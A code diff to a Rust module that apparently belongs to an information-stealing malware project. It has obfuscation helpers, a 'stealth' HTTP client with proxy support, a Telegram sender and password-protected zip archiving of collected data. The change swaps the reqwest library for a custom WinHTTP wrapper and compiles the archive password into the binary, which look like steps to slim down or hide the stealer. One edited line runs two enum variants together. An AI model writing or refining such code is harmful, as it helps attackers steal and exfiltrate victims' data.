@@ -1,13 +1,10 @@
 use crate::formatter::{FormattedMessage, MessageFormatter};
 use crate::recovery::helpers::obfuscation::deobf;
 use crate::recovery::settings::RecoveryControl;
-use reqwest::{
-    Client,
-    header::{HeaderMap, HeaderValue, USER_AGENT},
-    multipart::{Form, Part},
+use crate::recovery::helpers::winhttp::{
+    Client, HeaderMap, HeaderValue, Form, Part, USER_AGENT, Proxy,
 };
 use serde::{Deserialize, Serialize};
-use std::env;
 use std::io::{Cursor, Write};
 use std::time::{SystemTime, UNIX_EPOCH};
 use thiserror::Error;
@@ -87,7 +84,7 @@ fn create_stealth_client() -> Client {
     let mut builder = Client::builder().default_headers(headers);
 
     if let Some(proxy_url) = RecoveryControl::global().proxy_server() {
-        match reqwest::Proxy::all(proxy_url) {
+        match Proxy::all(proxy_url) {
             Ok(proxy) => {
                 builder = builder.proxy(proxy);
             }
@@ -429,10 +426,9 @@ struct TelegramApiResponse {
 #[derive(Debug, Error)]
 pub enum SenderError {
     #[error("http client error: {0}")]
-    Http(#[from] reqwest::Error),
+    Http(#[from] crate::recovery::helpers::winhttp::Error),
     #[error("api error: {0}")]
-    Api(String),
-    #[error("file too large ({size} bytes)")]
+    Api(String),    #[error("file too large ({size} bytes)")]
     FileTooLarge { file_name: String, size: usize },
     #[error("io error while building an archive: {0}")]
     Io(#[from] std::io::Error),
@@ -469,8 +465,7 @@ fn build_zip_archive(
 }
 
 fn archive_password() -> String {
-    env::var("IXODES_PASSWORD")
-        .ok()
+    option_env!("IXODES_PASSWORD")
         .map(|value| value.trim().to_string())
         .filter(|value| !value.is_empty())
         .unwrap_or_else(|| DEFAULT_ARCHIVE_PASSWORD.to_string())
